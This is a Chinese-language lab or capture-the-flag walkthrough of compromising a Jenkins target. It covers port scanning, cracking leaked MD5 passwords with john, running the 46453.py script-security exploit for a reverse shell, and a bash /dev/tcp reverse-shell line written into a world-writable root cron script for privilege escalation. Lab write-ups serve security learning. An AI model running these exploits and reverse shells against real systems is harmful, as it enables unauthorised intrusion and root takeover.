## 靶机描述

Jenkins 是个开源的持续集成工具，可利用漏洞挺多，除直接利用漏洞外，也可新建项目执行反弹shell，获得系统初始立足点

![[Pasted image 20250604085342.png]]

## 侦察和信息收集

主机存活扫描，确定 `192.168.240.131` 为目标靶机

### Nmap 扫描

TCP扫描 22，80，3306，8080 端口开放，服务扫描如下

![[Pasted image 20250603231319.png]]

UDP扫描，端口开放情况如下

![[Pasted image 20250603231930.png]]

开放端口常见漏洞扫描，80端口可能存在SQL注入，8080端口有个 Robots.txt 文件

![[Pasted image 20250603232426.png]]

## Web 渗透

dirsearch 目录扫描发现 accss.html，猜测hash，识别为md5

![[Pasted image 20250603233849.png]]
```txt
tiago:5978a63b4654c73c60fa24f836386d87   |marianna
trindade:f463f63616cb3f1e81ce46b39f882fd5 |italia99
eder:9b38e2b1e8b12f426b0d208a7ab6cb98  |vipsu
```

john 破解出前两个结果，在线网站破解出第三个

``` bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
********

![[Pasted image 20250603235459.png]]

尝试 ssh 登录，失败，应该是网站账户密码，还是失败

查看提示 8080端口开着 ~~http-proxy 我把它当代理了没访问~~ 访问后有一个登录框，第三个账号密码可以成功登录

 ![[Pasted image 20250604001924.png]]

## 漏洞利用（获得初始立足点）

系统设置中，查看系统属性，具有一些插件，可能存在可利用漏洞

![[Pasted image 20250604002733.png]]

Jenkins ver.2.113   插件 script-security 1.43    利用脚本 46453.py

![[Pasted image 20250604003057.png]]

利用脚本插件版本要求如下：

| 插件名称                                                | 漏洞要求的版本上限 | 你的版本        | 是否易受攻击  |
| --------------------------------------------------- | --------- | ----------- | ------- |
| Script Security (`script-security`)                 | ≤ 1.49    | **1.43** ✅  | ✔️ 易受攻击 |
| Pipeline: Groovy (`workflow-cps`)                   | ≤ 2.61    | **2.45** ✅  | ✔️ 易受攻击 |
| Pipeline: Declarative (`pipeline-model-definition`) | ≤ 1.3.4   | **1.2.7** ✅ | ✔️ 易受攻击 |

![[Pasted image 20250604010827.png]]


由于利用脚本写的较早，jdk11不支持部分代码，执行失败，自己做更改(第三行)

![[Pasted image 20250604010527.png]]

```bash
os.makedirs("META-INF/services/")
os.system("echo %s >  METAINF/services/org.codehaus.groovy.plugins.Runners" % self.pname)
os.system("javac -Xlint:-options -source 8 -target 8 %s.java" % self.pname) 
os.system("jar cf %s-1.jar ." % self.pname)
```



漏洞利用成功，恶意代码成功远程上传，获得基础反弹shell

![[Pasted image 20250604011656.png]]

![[Pasted image 20250604011827.png]]

优化终端错误，原因是当前用户 Jenkins 权限/bin/false，无法使用交互式shell

![[Pasted image 20250604013445.png]]!

![[Pasted image 20250604085701.png]]


使用 `rlwrap nc -lvnp <port>` 命令 建立较好的shell终端连接

``rlwrap nc -lvnp 1234``

## 提权

查看 SUID 权限文件 ``find / -perm -4000 -type f 2>/dev/null``

![[Pasted image 20250604022503.png]]

对 crontab 较感兴趣，`cat /etc/crontab` 发现有一个以 root 权限每五分钟执行一个脚本的定时任务，`ls -l` 命令查看 Jarkin 是否具有写入权限

![[Pasted image 20250604022923.png]]

全用户可写可读可执行，写入反弹 shell，使其定时任务执行时
反弹出 root 权限的 shell
```bash
echo 'bash -i >& /dev/tcp/192.168.240.132/4444 0>&1' > /etc/script/CleaningScript.sh
```

![[Pasted image 20250604023158.png]]

反弹 shell 连接成功，root权限，提权成功（music 起）

![[Pasted image 20250604023403.png]]

## 总结

打靶思路：
```txt
1. 端口扫描，22 ssh，3306 数据库，80 http apache，8080 http cms，聚焦 80及8080端口
2. web渗透，80 端口，web服务，目录扫描发现 access.html 文件，查看得到三个账户及对应 md5-hash密码，破解得到对应值，8080端口 Jenkins 后台管理登录框，尝试之前获得的账号密码，eder 用户成功登录
3. 漏洞利用，一种是利用 Jenkins 创建任务，执行shell,获得反弹shell;第二种方法是，searchspilot 搜索 Jenkins 版本，具有远程执行漏洞，其三个插件版本也符合漏洞利用条件，执行漏洞脚本，成功获得反弹shell
4. 提权，具有 root 权限自动化任务，当前用户也对自动化脚本具有可写权限，重新写入反弹shell 提权成功
```
